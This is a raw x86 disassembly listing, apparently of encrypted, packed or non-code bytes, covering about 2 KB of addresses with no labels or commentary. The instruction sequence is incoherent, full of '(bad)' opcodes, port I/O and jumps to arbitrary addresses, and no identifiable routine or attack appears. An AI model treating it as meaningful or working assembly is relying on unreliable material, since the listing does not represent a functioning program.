  408521:	pop    edx
  408522:	dec    esp
  408523:	xchg   esp,esi
  408525:	xchg   DWORD PTR [eax],ecx
  408527:	jg     0x408525
  408529:	loope  0x408557
  40852b:	jns    0x54b892d5
  408531:	adc    bl,ch
  408533:	push   esi
  408534:	push   ds
  408535:	dec    edx
  408536:	mov    bl,0xf5
  408538:	inc    esi
  408539:	or     dl,BYTE PTR [esi-0x1468ef9b]
  40853f:	out    0x87,eax
  408541:	lea    eax,[ebp+0x56e05186]
  408547:	adc    al,BYTE PTR [edi-0x6dcc1c0]
  40854d:	cs ret 
  40854f:	ret    0x6c65
  408552:	and    cl,BYTE PTR ds:0x2072b861
  408558:	pop    es
  408559:	adc    al,0xac
  40855b:	fstp   QWORD PTR [ebx+eax*2]
  40855e:	bound  esp,QWORD PTR ds:[eax-0x36]
  408562:	test   DWORD PTR [ebx+0xc0e1415],edi
  408568:	addr16 xor eax,0x136f4012
  40856e:	stc    
  40856f:	scas   eax,DWORD PTR es:[edi]
  408570:	cmp    bl,BYTE PTR [eax]
  408572:	out    dx,eax
  408573:	push   ecx
  408574:	push   ebp
  408575:	aaa    
  408576:	adc    ebx,DWORD PTR [edx]
  408578:	rcl    DWORD PTR [edi],1
  40857a:	or     DWORD PTR [edi+0x3e],ebx
  40857d:	inc    esp
  40857e:	pushf  
  40857f:	mov    edi,0xc48a217c
  408584:	hlt    
  408585:	cmp    eax,0x99860618
  40858a:	popa   
  40858b:	loop   0x408580
  40858d:	nop
  40858e:	and    eax,0xfe640ebe
  408593:	cmp    BYTE PTR [esi],0xcc
  408596:	les    esp,FWORD PTR [ebx]
  408598:	fcmovnbe st,st(7)
  40859a:	jmp    0x15d6ecd2
  40859f:	push   0xc90494c3
  4085a4:	stos   DWORD PTR es:[edi],eax
  4085a5:	retf   0x8c4a
  4085a8:	sti    
  4085a9:	or     edi,DWORD PTR [ecx]
  4085ab:	inc    ebp
  4085ac:	aad    0x39
  4085ae:	pop    esi
  4085af:	fwait
  4085b0:	adc    eax,0x7028a016
  4085b5:	mov    dl,0x2c
  4085b7:	xchg   esi,eax
  4085b8:	mov    ?,WORD PTR [edi+0x67]
  4085bb:	mov    bl,BYTE PTR [eax+0x4815693]
  4085c1:	jmp    0x4f927d6c
  4085c6:	test   eax,0xb0466ce3
  4085cb:	cs fld1 
  4085ce:	scas   eax,DWORD PTR es:[edi]
  4085cf:	adc    edx,DWORD PTR [ecx+0x73f9d5ef]
  4085d5:	into   
  4085d6:	loop   0x40855c
  4085d8:	das    
  4085d9:	push   0xffffff87
  4085db:	cmp    al,bh
  4085dd:	outs   dx,DWORD PTR ds:[esi]
  4085de:	das    
  4085df:	lock int3 
  4085e1:	stos   BYTE PTR es:[edi],al
  4085e2:	repz push eax
  4085e4:	(bad)  
  4085e5:	loop   0x40859d
  4085e7:	mov    ds:0x492ccebb,eax
  4085ec:	and    BYTE PTR [edx],0xbc
  4085ef:	in     eax,0xad
  4085f1:	xor    esp,DWORD PTR [edi-0x6e]
  4085f4:	or     dl,bl
  4085f6:	fmul   QWORD PTR [esi]
  4085f8:	mov    bl,0x57
  4085fa:	cli    
  4085fb:	and    al,0x86
  4085fd:	jle    0x4085cb
  4085ff:	xchg   edx,eax
  408600:	dec    esp
  408601:	inc    esp
  408602:	dec    edi
  408603:	and    dl,bl
  408605:	les    eax,FWORD PTR [edx]
  408607:	fsubp  st(7),st
  408609:	xchg   esi,eax
  40860a:	call   0x238a13e9
  40860f:	xor    eax,0x603bea45
  408614:	mov    bh,0x3b
  408616:	call   0x6307:0x8b0a260f
  40861d:	and    al,0x47
  40861f:	shr    DWORD PTR fs:[edx-0x31adc861],cl
  408626:	xchg   esp,eax
  408627:	mov    WORD PTR [edx-0x48],gs
  40862a:	push   ebx
  40862b:	push   cs
  40862c:	in     al,dx
  40862d:	xor    DWORD PTR [ecx-0x4f0bce62],ebx
  408633:	arpl   WORD PTR [ebp-0x47],bp
  408636:	mov    edx,0xed170623
  40863b:	push   0xffffff9b
  40863d:	test   BYTE PTR [ebx+0x7b996b33],bh
  408643:	jle    0x40862a
  408645:	ins    BYTE PTR es:[edi],dx
  408646:	ja     0x408676
  408648:	adc    ebp,esi
  40864a:	sti    
  40864b:	add    BYTE PTR [edi-0x7d217daa],bh
  408651:	icebp  
  408652:	test   bl,dh
  408654:	jnp    0x408692
  408656:	and    BYTE PTR [ebp+0x26],ah
  408659:	(bad)  
  40865b:	adc    BYTE PTR [ecx-0x3d97bef0],al
  408661:	stc    
  408662:	sub    edi,DWORD PTR [edx+eax*2-0x78a84be4]
  408669:	pop    edi
  40866a:	pushf  
  40866b:	mov    dl,ah
  40866d:	loop   0x4086cb
  40866f:	outs   dx,DWORD PTR ds:[esi]
  408670:	inc    edi
  408671:	cmp    BYTE PTR [ebp-0x12d7312e],ch
  408677:	jno    0x40860d
  408679:	(bad)  
  40867a:	fs xchg esp,eax
  40867c:	inc    edx
  40867d:	cmp    al,0xfb
  40867f:	mov    esi,0xe8074c79
  408684:	ret    0xf939
  408687:	cdq    
  408688:	mov    esp,0xf4e681dd
  40868d:	inc    eax
  40868e:	(bad)  
  40868f:	push   ss
  408690:	sbb    al,0xbd
  408692:	cmp    al,0xad
  408694:	jl     0x4086db
  408696:	sbb    BYTE PTR [edx-0x25169e7b],dl
  40869c:	xchg   ebx,eax
  40869d:	repz aas 
  40869f:	mov    bl,0xca
  4086a1:	lea    esp,[ebx+ebp*1-0x4804c15c]
  4086a8:	fidivr DWORD PTR [eax]
  4086aa:	cdq    
  4086ab:	xor    BYTE PTR [ebx],al
  4086ad:	ds mov ah,0x13
  4086b0:	push   esi
  4086b1:	fcmovb st,st(0)
  4086b3:	dec    esi
  4086b4:	push   0x1fe8100
  4086b9:	add    al,0xbc
  4086bb:	(bad)  [edx-0x66f2414d]
  4086c1:	mov    ch,0x1b
  4086c3:	mov    ebx,0x4ba315b6
  4086c8:	sub    eax,0xd5031c5c
  4086cd:	sti    
  4086ce:	cmc    
  4086cf:	cmp    BYTE PTR [ecx+edi*2-0x3c31c7fd],dl
  4086d6:	aaa    
  4086d7:	cwde   
  4086d8:	int3   
  4086d9:	outs   dx,BYTE PTR ds:[esi]
  4086da:	adc    al,0xe2
  4086dc:	adc    al,0xb3
  4086de:	fbld   TBYTE PTR [ecx+0x58]
  4086e1:	dec    edx
  4086e2:	cmp    al,BYTE PTR [eax-0x19]
  4086e5:	sub    cl,BYTE PTR [edi-0x5ef7d71f]
  4086eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086ec:	ret    
  4086ed:	pop    ds
  4086ee:	or     DWORD PTR ds:0x73545148,edi
  4086f4:	mov    esi,0x49f956cc
  4086f9:	cmp    eax,0x10ea61da
  4086fe:	pop    ecx
  4086ff:	push   es
  408700:	pop    eax
  408701:	das    
  408702:	jo     0x4086e6
  408704:	rcl    DWORD PTR [ebp+0x46381f96],0xb1
  40870b:	in     al,dx
  40870c:	mov    esi,0xd65a3b80
  408711:	dec    esp
  408712:	sbb    esi,eax
  408714:	push   ebp
  408715:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408716:	scas   al,BYTE PTR es:[edi]
  408717:	or     ecx,DWORD PTR [ecx-0x6b]
  40871a:	imul   edi,DWORD PTR [esi+0x1b879f38],0xef5918e8
  408724:	push   es
  408725:	pop    ecx
  408726:	sub    BYTE PTR [edx-0x664fd574],bh
  40872c:	iret   
  40872d:	ss push ss
  40872f:	xchg   edx,eax
  408730:	mov    ecx,0xcd68ca60
  408735:	inc    edx
  408736:	xor    eax,0x86a4ad4
  40873b:	mov    ah,0xb6
  40873d:	enter  0xa20e,0x12
  408741:	in     eax,dx
  408742:	jle    0x40877f
  408744:	out    0x47,eax
  408746:	push   0xffffffce
  408748:	mov    ds:0xd8c2a3d,al
  40874d:	or     edi,DWORD PTR [eax+0xb93138c]
  408753:	and    dh,ah
  408755:	xchg   esi,eax
  408756:	imul   edi,ebp,0xb7cc3b0b
  40875c:	add    eax,0xece4388d
  408761:	fwait
  408762:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408763:	xor    eax,0x263edad
  408768:	inc    ecx
  408769:	or     al,0x8e
  40876b:	dec    eax
  40876d:	push   ebx
  40876e:	adc    BYTE PTR [edi-0x50],dh
  408771:	idiv   dh
  408773:	fidiv  DWORD PTR [ecx-0x6193443f]
  408779:	cmp    DWORD PTR [eax+0x21],ecx
  40877c:	jne    0x4087b3
  40877e:	clc    
  40877f:	xor    al,0x30
  408781:	aaa    
  408782:	sub    BYTE PTR [edi],ah
  408784:	jne    0x408767
  408786:	std    
  408787:	out    0xde,eax
  408789:	dec    edi
  40878a:	mov    cl,0x28
  40878c:	pop    edx
  40878d:	and    DWORD PTR [ebx-0x4f41fffb],edx
  408793:	adc    al,0xf8
  408795:	cld    
  408796:	mov    esi,0x9857d2df
  40879b:	les    edi,FWORD PTR [ecx+eax*8]
  40879e:	inc    ebp
  40879f:	adc    al,0xf5
  4087a1:	js     0x4087d6
  4087a3:	jmp    0x4087ca
  4087a5:	mov    edi,0x660e1791
  4087aa:	shr    DWORD PTR [ecx],cl
  4087ac:	jmp    FWORD PTR [esi]
  4087ae:	in     al,0xd8
  4087b0:	fdiv   DWORD PTR [ecx-0x7d]
  4087b3:	retf   0xa0a9
  4087b6:	inc    esi
  4087b7:	mov    bh,bl
  4087b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087ba:	mov    gs,edi
  4087bc:	add    DWORD PTR [esi+ebx*8-0x33173505],eax
  4087c3:	mov    dl,0xbb
  4087c5:	sbb    al,0x3
  4087c7:	or     ah,BYTE PTR [ebp+0x6e1cefb5]
  4087cd:	scas   al,BYTE PTR es:[edi]
  4087ce:	xchg   esi,eax
  4087cf:	mov    cl,0x39
  4087d1:	in     al,dx
  4087d2:	ds int3 
  4087d4:	mov    ah,0xfa
  4087d6:	sbb    DWORD PTR [eax-0x55],ebx
  4087d9:	fsub   QWORD PTR [ecx+ebp*1-0x14a8f463]
  4087e0:	pop    esp
  4087e1:	rcl    edx,0x42
  4087e4:	xor    DWORD PTR [eax],ecx
  4087e6:	xchg   edx,eax
  4087e7:	pop    esi
  4087e8:	xor    al,0x45
  4087ea:	adc    ecx,DWORD PTR [edi]
  4087ec:	mov    bl,0xeb
  4087ee:	cmp    al,0x4e
  4087f0:	mov    ebx,0x19c4ad82
  4087f5:	cmp    esp,DWORD PTR [ebp-0x6b]
  4087f8:	fs popf 
  4087fa:	cmp    bh,BYTE PTR [edi+0x22]
  4087fd:	int    0x45
  4087ff:	adc    eax,0xdbca4fbc
  408804:	aad    0xde
  408806:	mov    eax,ds:0x73350de0
  40880b:	jbe    0x408879
  40880d:	push   edi
  40880e:	ins    DWORD PTR es:[edi],dx
  40880f:	addr16 jno 0x408850
  408812:	adc    ah,bl
  408814:	loop   0x408844
  408816:	shr    ch,0xd6
  408819:	aad    0xb2
  40881b:	(bad)  
  40881c:	ins    BYTE PTR es:[edi],dx
  40881d:	stc    
  40881e:	inc    esi
  40881f:	push   edi
  408820:	test   DWORD PTR [ebx+0x68d494cc],edi
  408826:	lock pop ebx
  408828:	inc    edi
  408829:	sbb    BYTE PTR ds:[ebp-0x55],cl
  40882d:	mov    ecx,0x8e0357de
  408832:	stos   DWORD PTR es:[edi],eax
  408833:	inc    ecx
  408834:	dec    eax
  408835:	jp     0x4087c4
  408837:	loop   0x4088ae
  408839:	and    eax,0x3990ed9a
  40883e:	mov    ah,BYTE PTR [eax]
  408840:	jmp    0xfdde:0x3f2b05e
  408847:	ja     0x408843
  408849:	retf   
  40884a:	adc    al,0xf9
  40884c:	faddp  st(6),st
  40884e:	in     eax,0x71
  408850:	and    ebx,DWORD PTR [ebp+eax*1+0x3d500648]
  408857:	test   ax,0xac4e
  40885b:	retf   
  40885c:	sahf   
  40885d:	push   ebp
  40885e:	pop    ecx
  40885f:	shl    BYTE PTR [esp+edx*4],cl
  408862:	popf   
  408863:	adc    ebp,esp
  408865:	cmp    bl,al
  408867:	je     0x4088b6
  408869:	aas    
  40886a:	test   BYTE PTR [eax],0x34
  40886d:	(bad)  
  40886e:	ret    0xb52e
  408871:	jge    0x408891
  408873:	(bad)  
  408875:	push   ds
  408876:	xchg   edi,eax
  408877:	retf   
  408878:	xchg   esp,eax
  408879:	cwde   
  40887a:	fdiv   DWORD PTR [ecx]
  40887c:	loope  0x408890
  40887e:	sub    ah,BYTE PTR [ebx-0x7b04bd5c]
  408884:	popa   
  408885:	and    al,0xfe
  408887:	repnz cld 
  408889:	rol    BYTE PTR [eax],0x9c
  40888c:	lea    edx,[esi+edi*1]
  40888f:	lea    esi,[edi]
  408891:	pop    esi
  408892:	test   DWORD PTR [ecx+ebp*8],edi
  408895:	add    eax,0x18a89a24
  40889a:	popa   
  40889b:	fdivr  DWORD PTR [ebx-0x48]
  40889e:	and    al,0xc1
  4088a0:	sub    BYTE PTR [ecx+ebx*4],dh
  4088a3:	aad    0x9
  4088a5:	fistp  QWORD PTR [esi]
  4088a7:	ja     0x4088a5
  4088a9:	inc    esi
  4088aa:	xchg   ebp,eax
  4088ab:	mov    ds:0x7aab6a64,al
  4088b0:	push   ds
  4088b1:	clc    
  4088b2:	call   0x6b1338ce
  4088b7:	xor    bh,BYTE PTR [esi-0x67862e3f]
  4088bd:	mov    ds:0x1ca933d8,eax
  4088c2:	stos   DWORD PTR es:[edi],eax
  4088c3:	sub    BYTE PTR [ebx],dl
  4088c5:	inc    eax
  4088c6:	mov    ebp,0x651c5caf
  4088cb:	jb     0x408938
  4088cd:	arpl   WORD PTR [ebp+0x7cb4d32],bx
  4088d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088d4:	sti    
  4088d5:	jmp    0x4088f5
  4088d7:	lea    edi,[ebp-0x25]
  4088da:	xchg   esi,eax
  4088db:	and    al,0x3b
  4088dd:	stos   BYTE PTR es:[edi],al
  4088de:	sub    eax,0x4b25c99a
  4088e3:	(bad)  
  4088e4:	mov    esi,0xeee637ad
  4088e9:	cli    
  4088ea:	arpl   WORD PTR [edx],bp
  4088ec:	loop   0x4088ef
  4088ee:	mov    DWORD PTR [esi+0x3958a413],ebx
  4088f4:	jp     0x40892d
  4088f6:	inc    ecx
  4088f7:	(bad)  
  4088f8:	outs   dx,BYTE PTR ds:[esi]
  4088f9:	dec    ebp
  4088fa:	xor    al,0xfc
  4088fc:	jmp    0x4ef5bd8e
  408901:	and    bh,ah
  408903:	dec    ebp
  408904:	rcr    BYTE PTR [ebx-0x5bc327a0],1
  40890a:	push   esi
  40890b:	leave  
  40890c:	xchg   ebp,eax
  40890d:	mov    bl,0x43
  40890f:	adc    DWORD PTR [ebp+eiz*4+0x84377ab],ecx
  408916:	push   ss
  408917:	jmp    0xa4c26237
  40891c:	in     al,dx
  40891d:	cmp    DWORD PTR [eax-0x42a6161a],ebx
  408923:	pop    ebp
  408924:	adc    dl,BYTE PTR [eax]
  408926:	mov    edi,DWORD PTR [ebp+ebp*2+0x7ea97dd7]
  40892d:	test   BYTE PTR [ebx],dh
  40892f:	mov    ds:0x2dbf10a1,al
  408934:	pusha  
  408935:	inc    ebx
  408936:	daa    
  408937:	outs   dx,BYTE PTR ds:[esi]
  408938:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408939:	mov    al,ds:0x24140529
  40893e:	ror    DWORD PTR [esi],cl
  408940:	jns    0x40899f
  408942:	hlt    
  408943:	mov    eax,0x7dbdb14a
  408948:	outs   dx,DWORD PTR ds:[esi]
  408949:	cdq    
  40894a:	jp     0x408945
  40894c:	enter  0xa655,0xcc
  408950:	fsubr  st(2),st
  408952:	in     al,dx
  408953:	test   al,0xb4
  408955:	jmp    0xf41b:0x6ecb1a9
  40895c:	dec    ebp
  40895d:	pusha  
  40895e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40895f:	adc    eax,0x99b41710
  408964:	leave  
  408965:	outs   dx,BYTE PTR ds:[esi]
  408966:	(bad)  [ecx]
  408968:	xor    BYTE PTR [edi+eax*8-0x1614141f],al
  40896f:	xchg   ebp,eax
  408970:	xchg   ch,ch
  408972:	call   0xb8b6015f
  408977:	xchg   edi,eax
  408978:	and    bl,BYTE PTR [bp+di+0x249]
  40897d:	lods   eax,DWORD PTR ds:[esi]
  40897e:	mov    BYTE PTR [ecx+0x49202def],ah
  408984:	inc    edi
  408985:	mov    al,ds:0x506881ab
  40898a:	sar    DWORD PTR [edx],cl
  40898c:	jg     0x40895e
  40898e:	aas    
  40898f:	in     eax,dx
  408990:	pop    eax
  408991:	repnz inc ebx
  408993:	dec    edx
  408994:	or     ch,ah
  408996:	test   eax,0xf789b2dc
  40899b:	pop    esp
  40899c:	push   esi
  40899d:	ret    
  40899e:	ret    0xbf6d
  4089a1:	jl     0x4089d8
  4089a3:	lock sbb eax,DWORD PTR [ecx]
  4089a6:	dec    ecx
  4089a7:	xchg   esi,eax
  4089a8:	or     BYTE PTR [esi],dh
  4089aa:	or     BYTE PTR [ebp-0x5f],al
  4089ad:	mov    bh,0x21
  4089af:	mov    dh,0xcb
  4089b1:	jmp    0x4089dd
  4089b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089b4:	mov    BYTE PTR [ebp+0x4b],0xc9
  4089b8:	pop    edi
  4089b9:	test   al,0x28
  4089bb:	call   0x22f8:0x75cb8955
  4089c2:	aam    0x21
  4089c4:	repz inc edi
  4089c6:	push   eax
  4089c7:	jmp    0x408961
  4089c9:	inc    edx
  4089ca:	add    al,0x5a
  4089cc:	push   cs
  4089cd:	mov    ebp,0x55235c7
  4089d2:	lea    ecx,[ebp-0x15]
  4089d5:	mov    ah,0x8d
  4089d7:	ja     0x408a01
  4089d9:	retf   
  4089da:	fwait
  4089db:	jle    0x4089a9
  4089dd:	push   esi
  4089de:	out    dx,al
  4089df:	fidiv  DWORD PTR [ebp-0x85de858]
  4089e5:	fimul  WORD PTR [ecx+ecx*8+0x5094e007]
  4089ec:	pop    edi
  4089ed:	les    esp,FWORD PTR [eax+0x5bf06c30]
  4089f3:	faddp  st(2),st
  4089f5:	sbb    bl,bl
  4089f7:	loop   0x4089ed
  4089f9:	dec    ecx
  4089fa:	sbb    ebp,DWORD PTR [edx+eiz*4+0x6b0bdcaf]
  408a01:	pop    eax
  408a02:	sbb    ebp,DWORD PTR [esi+0xdd9a6f9]
  408a08:	int    0x24
  408a0a:	in     eax,dx
  408a0b:	xchg   eax,edi
  408a0d:	dec    esi
  408a0e:	jno    0x408a37
  408a10:	mov    gs,WORD PTR [edi-0x349f6fe9]
  408a16:	mov    eax,ds:0xc20b503a
  408a1b:	pop    esi
  408a1c:	pushf  
  408a1d:	adc    BYTE PTR [eax-0x1a],cl
  408a20:	xchg   ebp,eax
  408a21:	pushf  
  408a22:	mov    bl,0x1f
  408a24:	jg     0x4089e6
  408a26:	sbb    BYTE PTR [eax+0x3],al
  408a29:	outs   dx,DWORD PTR ds:[esi]
  408a2a:	sbb    eax,0x95e94301
  408a2f:	push   0xffffffc8
  408a31:	xchg   esi,eax
  408a32:	adc    BYTE PTR [eax-0xd60ffdb],dl
  408a38:	push   eax
  408a39:	sub    ebp,DWORD PTR [esi+0x65]
  408a3c:	scas   al,BYTE PTR es:[edi]
  408a3d:	ret    0xde6b
  408a40:	cmc    
  408a41:	mul    BYTE PTR [edx+0x1d]
  408a44:	(bad)  
  408a45:	fsubp  st(6),st
  408a47:	and    bl,bl
  408a49:	mov    esi,DWORD PTR [eax-0x6f064838]
  408a4f:	mov    al,ds:0x7579295b
  408a54:	int    0x43
  408a56:	mov    eax,0xe38996d1
  408a5b:	add    eax,0x4d552570
  408a60:	ins    BYTE PTR es:[edi],dx
  408a61:	pop    esp
  408a62:	cmp    DWORD PTR [ebx+0x66],edi
  408a65:	push   esp
  408a66:	jle    0x408a6f
  408a68:	jge    0x408aa9
  408a6a:	sub    eax,0x13838c1
  408a6f:	inc    esp
  408a70:	out    0xa3,al
  408a72:	mov    edx,0x48f459d0
  408a77:	ins    BYTE PTR es:[edi],dx
  408a78:	dec    BYTE PTR [eax]
  408a7a:	out    0x90,eax
  408a7c:	jno    0x408aa8
  408a7e:	cli    
  408a7f:	or     eax,0xe0d0eb4b
  408a84:	iret   
  408a85:	rol    BYTE PTR [edx],1
  408a87:	inc    ebp
  408a88:	cs ret 
  408a8a:	sbb    bh,BYTE PTR [edx-0x28]
  408a8d:	loope  0x408a6b
  408a8f:	ret    0xff50
  408a92:	inc    edi
  408a93:	jbe    0x408a18
  408a95:	ins    BYTE PTR es:[edi],dx
  408a96:	cmc    
  408a97:	pop    esi
  408a98:	call   FWORD PTR [ebx-0x30]
  408a9b:	xchg   ecx,eax
  408a9c:	popa   
  408a9d:	scas   eax,DWORD PTR es:[edi]
  408a9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a9f:	aas    
  408aa0:	xor    DWORD PTR [edi-0x2682db28],0x22
  408aa7:	jmp    0x90a2:0x4980935d
  408aae:	xor    bh,ah
  408ab0:	sub    al,BYTE PTR [eax+0x709dfefd]
  408ab6:	ds addr16 xchg esp,eax
  408ab9:	pusha  
  408aba:	sbb    BYTE PTR [eax+0x26ff2a5a],bl
  408ac0:	call   0xaa4f:0xb100b66
  408ac7:	or     BYTE PTR [ebx-0x1c0ca51c],cl
  408acd:	push   0x6a
  408acf:	in     al,dx
  408ad0:	push   ss
  408ad1:	mov    bh,0x11
  408ad3:	out    0xa7,al
  408ad5:	inc    ebx
  408ad6:	repz jp 0x408aae
  408ad9:	test   BYTE PTR [esi+0x75],ah
  408adc:	dec    ebp
  408add:	push   edi
  408ade:	cmp    eax,0xfa8ebb9b
  408ae3:	jns    0x408a86
  408ae5:	out    dx,al
  408ae6:	jo     0x408b64
  408ae8:	or     eax,edi
  408aea:	xchg   ecx,eax
  408aeb:	jmp    0xe6ee:0x502f37a1
  408af2:	sub    DWORD PTR [esi-0x24],ebx
  408af5:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  408af7:	inc    eax
  408af8:	mov    al,ds:0x30204026
  408afd:	fs data16 mov ah,0xd2
  408b01:	add    BYTE PTR [eax],0xcd
  408b04:	xor    al,0x31
  408b06:	imul   ecx,DWORD PTR [esi+0xb92b2e1],0xffffffd4
  408b0d:	aas    
  408b0e:	jle    0x408b53
  408b10:	int    0x18
  408b12:	in     al,dx
  408b13:	sbb    al,0xd1
  408b15:	fst    DWORD PTR [esi-0x4e877494]
  408b1b:	std    
  408b1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b1d:	loopne 0x408b1b
  408b1f:	ds jmp 0x3719:0xe09f6943
  408b27:	dec    ecx
  408b28:	retf   0x61a5
  408b2b:	std    
  408b2c:	sub    ch,ch
  408b2e:	jb     0x408b0f
  408b30:	aam    0x26
  408b32:	test   DWORD PTR [ebp+0x5e],edx
  408b35:	dec    ax
  408b37:	xchg   edx,eax
  408b38:	(bad)  
  408b39:	(bad)  
  408b3a:	or     dh,dh
  408b3c:	sub    eax,0x521d904e
  408b41:	xchg   edx,eax
  408b42:	adc    DWORD PTR [ecx+0x3b],0xcfb7aa88
  408b49:	stos   DWORD PTR es:[edi],eax
  408b4a:	ins    BYTE PTR es:[edi],dx
  408b4b:	or     al,0x4a
  408b4d:	rcr    dl,1
  408b4f:	mov    ah,0xa9
  408b51:	ss xchg bl,dh
  408b54:	mov    dh,0xf9
  408b56:	or     BYTE PTR [ecx+eax*8-0x275d7f07],bl
  408b5d:	jl     0x408b6e
  408b5f:	adc    DWORD PTR [edi-0x46],0x16ae3ddf
  408b66:	sbb    bh,bl
  408b68:	adc    al,0x82
  408b6a:	fs adc ch,0x9f
  408b6e:	jno    0x408b63
  408b70:	and    dl,BYTE PTR [edx-0x1]
  408b73:	push   eax
  408b74:	ins    BYTE PTR es:[edi],dx
  408b75:	cmp    eax,0x450df6f5
  408b7a:	aaa    
  408b7b:	jbe    0x408aff
  408b7d:	aad    0x22
  408b7f:	push   esi
  408b80:	adc    eax,0xbe8ccb49
  408b85:	inc    edx
  408b86:	pop    es
  408b87:	aam    0x77
  408b89:	push   eax
  408b8a:	xlat   BYTE PTR ds:[ebx]
  408b8b:	adc    dh,BYTE PTR [ecx+0x46dd24ff]
  408b91:	sub    ch,BYTE PTR [edi]
  408b93:	inc    esp
  408b94:	ret    0xe7c8
  408b97:	xchg   edx,eax
  408b98:	mov    WORD PTR [edi-0x7536bf2c],fs
  408b9e:	adc    BYTE PTR [edi-0x50],dh
  408ba1:	push   ebx
  408ba2:	jecxz  0x408b68
  408ba4:	fldcw  WORD PTR [eax]
  408ba6:	mov    ah,BYTE PTR [ebp+0x1]
  408ba9:	inc    ebp
  408baa:	popa   
  408bab:	jnp    0x408b90
  408bad:	(bad)  
  408baf:	jg     0x408baa
  408bb1:	jmp    0x911b:0xce116249
  408bb8:	mov    ss,WORD PTR [esi+0x26]
  408bbb:	mov    dl,0x4c
  408bbd:	push   cs
  408bbe:	mov    ebx,0xdc99ac01
  408bc3:	sub    edi,esi
  408bc5:	dec    edx
  408bc6:	fadd   DWORD PTR [eax+0x655179d9]
  408bcc:	data16 jge 0x408bf9
  408bcf:	pop    ss
  408bd0:	cmp    bl,bl
  408bd2:	fcmovb st,st(1)
  408bd4:	pop    esp
  408bd5:	dec    edi
  408bd6:	fs jmp 0x935f:0x8a7cf5d1
  408bde:	mov    ebp,0x3d916f7
  408be3:	mov    eax,0x1d357640
  408be8:	loope  0x408bef
  408bea:	and    edx,esi
  408bec:	pushf  
  408bed:	pop    ebp
  408bee:	xchg   edx,eax
  408bef:	adc    DWORD PTR ds:0xf50be468,esp
  408bf5:	aam    0xab
  408bf7:	sub    DWORD PTR [ebp+eax*4+0x44],ebx
  408bfb:	ds pop edx
  408bfd:	loope  0x408bf4
  408bff:	repz push eax
  408c01:	mov    ch,0xf0
  408c03:	mov    es,WORD PTR [ecx-0x51]
  408c06:	outs   dx,DWORD PTR ds:[esi]
  408c07:	cmp    ebp,edx
  408c09:	jnp    0x408bea
  408c0b:	push   esp
  408c0c:	inc    ebx
  408c0d:	dec    ebx
  408c0e:	jne    0x408bea
  408c10:	popf   
  408c11:	adc    al,BYTE PTR [ebx-0x1214e0aa]
  408c17:	imul   ebp,DWORD PTR [edi+0x4],0x3210ca2f
  408c1e:	push   0xb19aed32
  408c23:	mov    edi,0x70f3a9a
  408c28:	xchg   ebx,eax
  408c29:	mov    BYTE PTR [bp-0x40e0],al
  408c2e:	retf   0x5743
  408c31:	mov    edi,DWORD PTR [ebx+esi*4+0x4b634615]
  408c38:	cmp    DWORD PTR [ebp-0x1b0d72ac],eax
  408c3e:	hlt    
  408c3f:	push   0x9e168975
  408c44:	loope  0x408c8b
  408c46:	test   ah,dh
  408c48:	out    0x32,eax
  408c4a:	jae    0x408bcd
  408c4c:	(bad)  
  408c4d:	arpl   bx,cx
  408c4f:	stc    
  408c50:	mov    dh,BYTE PTR [ebx-0x443f9244]
  408c56:	push   ds
  408c57:	adc    ch,BYTE PTR [edi+0x7f]
  408c5a:	add    edi,ebx
  408c5c:	enter  0xdd7e,0xfb
  408c60:	adc    edi,DWORD PTR [eax+0x2f47d485]
  408c66:	test   al,0xaf
  408c68:	test   al,0x7f
  408c6a:	jmp    0x408c17
  408c6c:	(bad)
  408c6f:	add    DWORD PTR [ebp-0x5c4163fe],0xb1e9411a
  408c79:	lods   al,BYTE PTR ds:[esi]
  408c7a:	sti    
  408c7b:	or     bh,BYTE PTR [edx+0x534246fb]
  408c81:	mov    ah,BYTE PTR [esi-0x3464f13c]
  408c87:	addr16 js 0x408c5b
  408c8a:	test   al,0xc3
  408c8c:	fcmovnbe st,st(3)
  408c8e:	xchg   esi,eax
  408c8f:	dec    esp
  408c90:	ret    
  408c91:	(bad)  
  408c92:	jmp    0x408c14
  408c94:	aas    
  408c95:	lods   al,BYTE PTR ds:[esi]
  408c96:	jp     0x408cb2
  408c98:	mov    esi,?
  408c9a:	es xor eax,0x459a2eb6
  408ca0:	mov    ebp,0x3d0606c2
  408ca5:	ins    DWORD PTR es:[edi],dx
  408ca6:	jns    0x408d10
  408ca8:	or     ebx,0xe4e8b65e
  408cae:	(bad)  
  408cb0:	dec    edi
  408cb1:	mov    DWORD PTR [edi+0x2b],edi
  408cb4:	push   DWORD PTR [esi-0x4e]
  408cb7:	lds    ecx,FWORD PTR [edi+0x20b39d6]
  408cbd:	leave  
  408cbe:	mov    cl,0xdf
  408cc0:	push   cs
  408cc1:	out    0x23,al
  408cc3:	xchg   DWORD PTR [ecx-0x5f],ecx
  408cc6:	nop
  408cc7:	jg     0x408cfb
  408cc9:	(bad)  
  408cca:	daa    
  408ccb:	je     0x408c7a
  408ccd:	mov    ecx,0x25f5c34
  408cd2:	jmp    0xa967:0xbcccbf4a
  408cd9:	pop    ss
  408cda:	add    eax,0x5956479
  408cdf:	push   0x19
  408ce1:	or     eax,0xb4ee470
  408ce6:	add    BYTE PTR [eax+0x16236e8f],ah
  408cec:	mov    ebx,0x7c5a7d84
  408cf1:	mov    bl,0x2a
  408cf3:	sbb    esi,esp
  408cf5:	xchg   DWORD PTR ds:0x9e9454b3,esp
  408cfb:	jno    0x408cd7
  408cfd:	fcomp  DWORD PTR [esi-0x40]
  408d00:	sar    DWORD PTR [edi-0x50],0x35
  408d04:	into   
  408d05:	mov    ds:0xbf45f4f8,al
  408d0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d0b:	and    eax,0xe43abbb4
  408d10:	dec    edi
  408d11:	and    DWORD PTR [ebx-0x32],ebp
  408d14:	hlt    
  408d15:	mov    eax,0xcd09562b
  408d1a:	and    BYTE PTR [esi],bl
  408d1c:	popa   
